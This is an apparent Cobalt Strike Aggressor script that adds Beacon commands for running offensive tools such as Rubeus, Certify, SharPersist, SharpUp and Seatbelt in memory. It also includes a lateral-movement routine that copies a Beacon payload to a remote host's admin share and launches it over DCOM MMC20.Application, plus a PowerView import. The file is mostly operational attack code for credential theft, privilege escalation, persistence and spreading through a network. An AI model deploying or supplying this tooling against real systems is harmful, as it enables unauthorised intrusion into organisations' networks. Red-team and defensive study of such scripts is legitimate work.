######################
# Execute assemblies #
######################
alias rubeus{
    local('$bid $asm $desc @args $argu');
    $bid = $1;
    $asm = "C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe";
    $desc = "Rubeus";
    @args = @_;
    remove(@args, $bid);
    $argu = join(' ', @args);
    if ($argu eq ""){
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
    }
    else{
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
    }
    bexecute_assembly!($1, $asm, $argu);
}
beacon_command_register(
    "rubeus", "Executes Rubeus assembly",
    "Usage: rubeus [arguments]\n\n" .
    "Uses execute-assembly to run the assembly and takes given arguments\n"
);


alias certify{
    local('$bid $asm $desc @args $argu');
    $bid = $1;
    $asm = "C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe";
    $desc = "Certify";
    @args = @_;
    remove(@args, $bid);
    $argu = join(' ', @args);
    if ($argu eq ""){
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
    }
    else{
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
    }
    bexecute_assembly!($1, $asm, $argu);
}
beacon_command_register(
    "certify", "Executes Certify assembly",
    "Usage: certify [arguments]\n\n" .
    "Uses execute-assembly to run the assembly and takes given arguments\n"
);


alias sqlrecon{
    local('$bid $asm $desc @args $argu');
    $bid = $1;
    $asm = "C:\\Tools\\SQLRecon\\SQLRecon\\bin\\Release\\SQLRecon.exe";
    $desc = "SQLRecon";
    @args = @_;
    remove(@args, $bid);
    $argu = join(' ', @args);
    if ($argu eq ""){
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
    }
    else{
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
    }
    bexecute_assembly!($1, $asm, $argu);
}
beacon_command_register(
    "sqlrecon", "Executes SQLRecon assembly",
    "Usage: sqlrecon [arguments]\n\n" .
    "Uses execute-assembly to run the assembly and takes given arguments\n"
);


alias seatbelt{
    local('$bid $asm $desc @args $argu');
    $bid = $1;
    $asm = "C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe";
    $desc = "Seatbelt";
    @args = @_;
    remove(@args, $bid);
    $argu = join(' ', @args);
    if ($argu eq ""){
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
    }
    else{
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
    }
    bexecute_assembly!($1, $asm, $argu);
}
beacon_command_register(
    "seatbelt", "Executes Seatbelt assembly",
    "Usage: seatbelt [arguments]\n\n" .
    "Uses execute-assembly to run the assembly and takes given arguments\n"
);


alias sharpersist{
    local('$bid $asm $desc @args $argu');
    $bid = $1;
    $asm = "C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe";
    $desc = "Sharpersist";
    @args = @_;
    remove(@args, $bid);
    $argu = join(' ', @args);
    if ($argu eq ""){
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
    }
    else{
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
    }
    bexecute_assembly!($1, $asm, $argu);
}
beacon_command_register(
    "sharpersist", "Executes Sharpersist assembly",
    "Usage: seatbelt [arguments]\n\n" .
    "Uses execute-assembly to run the assembly and takes given arguments\n"
);

alias sharup{
    local('$bid $asm $desc @args $argu');
    $bid = $1;
    $asm = "C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe";
    $desc = "SharpUp";
    @args = @_;
    remove(@args, $bid);
    $argu = join(' ', @args);
    if ($argu eq ""){
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
    }
    else{
        blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
    }
    bexecute_assembly!($1, $asm, $argu);
}
beacon_command_register(
    "sharpup", "Executes SharpUp assembly",
    "Usage: sharpup [arguments]\n\n" .
    "Uses execute-assembly to run the assembly and takes given arguments\n"
);



####################
# Lateral movement #
####################
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1)
    closef($handle);

    $oneliner = beacon_host_script($1, $script);

    $payload = artifact_payload($3, "exe", "x64");

    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);



######################
# Powershell Imports #
######################
alias powerup {
    bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
}


